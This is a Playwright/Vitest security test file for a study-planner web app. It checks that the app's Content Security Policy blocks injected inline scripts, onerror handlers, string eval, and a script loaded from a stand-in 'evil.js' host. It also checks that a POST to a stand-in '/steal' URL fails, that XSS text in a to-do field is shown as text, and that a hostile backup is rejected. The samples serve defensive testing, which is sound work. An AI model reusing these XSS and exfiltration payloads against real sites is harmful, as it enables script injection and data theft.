/** The single-file app runs under a strict Content Security Policy. These check the browser really enforces it. */
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import type { Browser } from "playwright-core";
import { go, LAPTOP, launch, loadSampleData, open, type Session } from "./helpers";

let browser: Browser;
let s: Session;
beforeAll(async () => {
  browser = await launch();
  s = await open(browser, LAPTOP);
  await loadSampleData(s.page);
});
afterAll(async () => browser?.close());

describe("security policy", () => {
  it("is present and strict", async () => {
    const csp = await s.page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute("content");
    expect(csp).toContain("default-src 'none'");
    expect(csp).toContain("object-src 'none'");
    expect(csp).toContain("base-uri 'none'");
    expect(csp).not.toContain("'unsafe-eval'");
    expect(csp).not.toMatch(/script-src[^;]*'unsafe-inline'/);
  });

  it("blocks an injected inline script and an inline event handler", async () => {
    const ran = await s.page.evaluate(async () => {
      const w = window as unknown as { __pwned?: number };
      const sc = document.createElement("script");
      sc.textContent = "window.__pwned = 1";
      document.body.appendChild(sc);
      const img = document.createElement("img");
      img.setAttribute("onerror", "window.__pwned = 2");
      img.src = "data:,broken";
      document.body.appendChild(img);
      await new Promise((r) => setTimeout(r, 300));
      return w.__pwned ?? 0;
    });
    expect(ran).toBe(0);
  });

  it("blocks eval and scripts from other websites", async () => {
    const r = await s.page.evaluate(async () => {
      // Test tools may eval freely, so check eval the way page code would hit it: a string timer.
      const w = window as unknown as { __evalRan?: number };
      (setTimeout as unknown as (code: string, ms: number) => void)("window.__evalRan = 1", 0);
      await new Promise((r) => setTimeout(r, 300));
      const evalWorked = w.__evalRan === 1;
      const loaded = await new Promise<boolean>((res) => {
        const sc = document.createElement("script");
        sc.src = "https://example.com/evil.js";
        sc.onload = () => res(true);
        sc.onerror = () => res(false);
        document.head.appendChild(sc);
        setTimeout(() => res(false), 1500);
      });
      return { evalWorked, loaded };
    });
    expect(r).toEqual({ evalWorked: false, loaded: false });
  });

  it("won't send data to an unlisted website", async () => {
    const sent = await s.page.evaluate(() => fetch("https://example.com/steal", { method: "POST", body: "data" }).then(() => true, () => false));
    expect(sent).toBe(false);
  });

  it("text that looks like HTML is shown as text, never run", async () => {
    const { page } = s;
    await go(page, "/todo");
    const evil = `<img src=x onerror="window.__pwned=3"><script>window.__pwned=4</script>`;
    await page.getByLabel("Add a task for today").fill(evil);
    await page.keyboard.press("Enter");
    await page.waitForTimeout(500);
    await expect(page.getByText(evil).first().isVisible()).resolves.toBe(true);
    expect(await page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned ?? 0)).toBe(0);
  });

  it("a restored backup can't sneak in broken or hostile data", async () => {
    const { page } = s;
    await go(page, "/settings");
    const bad = JSON.stringify({ app: "exam-pilot", data: { exams: [{ id: 1 }], analyses: [], settings: {}, tasks: [{ id: "t", dueDate: "<b>" }], topics: [], revisions: [], notebook: [], practiceSets: [], planChanges: [], version: 1, isDemo: false } });
    const [chooser] = await Promise.all([page.waitForEvent("filechooser"), page.getByRole("button", { name: "Restore from backup" }).click()]);
    await chooser.setFiles({ name: "backup.json", mimeType: "application/json", buffer: Buffer.from(bad) });
    await page.waitForTimeout(600);
    await expect(page.getByText(/isn.t a valid Student OS backup/i).first().isVisible()).resolves.toBe(true);
    await go(page, "/exams");
    expect(await page.locator('a[href*="/exam/"]').count()).toBeGreaterThan(0); // existing data untouched
  });
});
